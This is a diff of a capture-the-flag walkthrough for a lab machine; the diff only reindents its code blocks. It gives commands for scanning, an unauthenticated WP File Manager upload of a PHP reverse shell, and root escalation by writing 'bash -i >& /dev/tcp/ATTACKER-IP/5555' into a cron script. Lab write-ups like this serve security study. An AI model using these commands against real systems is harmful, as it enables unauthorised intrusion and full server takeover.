@@ -5,7 +5,7 @@
 ### Nmap Scan
 
 ```bash
-nmap -sC -sV -p- TARGET-IP
+ nmap -sC -sV -p- TARGET-IP
 ```
 
 ### Findings
@@ -20,13 +20,13 @@ nmap -sC -sV -p- TARGET-IP
 ### Directory Brute Force
 
 ```bash
-gobuster dir -u http://TARGET-IP -w /usr/share/wordlists/dirb/common.txt
+ gobuster dir -u http://TARGET-IP -w /usr/share/wordlists/dirb/common.txt
 ```
 
 ### Key Discovery
 
 ```text
-/wordpress/
+ /wordpress/
 ```
 
 ---
@@ -38,7 +38,7 @@ The **WP File Manager plugin** is vulnerable to unauthenticated file upload.
 ### Vulnerable Endpoint
 
 ```text
-/wordpress/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
+ /wordpress/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
 ```
 
 ---
@@ -46,10 +46,10 @@ The **WP File Manager plugin** is vulnerable to unauthenticated file upload.
 ### Upload Reverse Shell
 
 ```bash
-curl -F "upload[]=@shell.php" \
--F "action=upload" \
--F "target=l1_Lw" \
-http://TARGET-IP/wordpress/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
+ curl -F "upload[]=@shell.php" \
+ -F "action=upload" \
+ -F "target=l1_Lw" \
+ http://TARGET-IP/wordpress/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
 ```
 
 ---
@@ -59,13 +59,13 @@ http://TARGET-IP/wordpress/wp-content/plugins/wp-file-manager/lib/php/connector.
 ### Start Listener
 
 ```bash
-nc -lvnp 4444
+ nc -lvnp 4444
 ```
 
 ### Trigger Shell
 
 ```text
-http://TARGET-IP/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php
+ http://TARGET-IP/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php
 ```
 
 ---
@@ -73,8 +73,8 @@ http://TARGET-IP/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.ph
 ## 🧠 Stabilize Shell
 
 ```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
+ python3 -c 'import pty; pty.spawn("/bin/bash")'
+ export TERM=xterm
 ```
 
 ---
@@ -84,13 +84,13 @@ export TERM=xterm
 ### Check Cron Jobs
 
 ```bash
-cat /etc/crontab
+ cat /etc/crontab
 ```
 
 ### Discovery
 
 ```text
-/opt/backup/backup.sh (runs as root)
+ /opt/backup/backup.sh (runs as root)
 ```
 
 ---
@@ -100,13 +100,13 @@ cat /etc/crontab
 ### Edit Script
 
 ```bash
-nano /opt/backup/backup.sh
+ nano /opt/backup/backup.sh
 ```
 
 ### Add Payload
 
 ```bash
-bash -i >& /dev/tcp/ATTACKER-IP/5555 0>&1
+ bash -i >& /dev/tcp/ATTACKER-IP/5555 0>&1
 ```
 
 ---
@@ -114,7 +114,7 @@ bash -i >& /dev/tcp/ATTACKER-IP/5555 0>&1
 ### Start Listener
 
 ```bash
-nc -lvnp 5555
+ nc -lvnp 5555
 ```
 
 Wait for cron execution.
@@ -126,7 +126,7 @@ Wait for cron execution.
 Once triggered:
 
 ```text
-root@machine:~#
+ root@machine:~#
 ```
 
 ---
@@ -134,7 +134,7 @@ root@machine:~#
 ## 🏁 Capture Flag
 
 ```bash
-cat /root/root_flag.txt
+ cat /root/root_flag.txt
 ```
 
 ---
@@ -142,7 +142,7 @@ cat /root/root_flag.txt
 ## 🎯 Attack Summary
 
 ```text
-Web Enumeration → WordPress → File Upload → Reverse Shell → Cron Exploit → Root
+ Web Enumeration → WordPress → File Upload → Reverse Shell → Cron Exploit → Root
 ```
 
 ---
